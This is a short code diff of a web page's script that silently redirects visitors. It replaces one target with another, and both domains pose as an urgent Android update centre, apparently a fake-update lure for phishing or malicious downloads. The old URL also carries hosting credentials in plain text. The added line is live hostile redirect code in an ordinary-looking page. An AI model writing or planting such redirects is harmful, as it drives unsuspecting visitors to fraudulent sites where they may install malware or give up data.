@@ -1,3 +1,3 @@
 <script>
-    window.location.replace("https://umbler:testehospedagem@android-update-center-com.umbler.net/");
+    window.location.replace("https://atualizacao-android-urgencia-marketing-online.shop-fy.online:171/");
 </script>
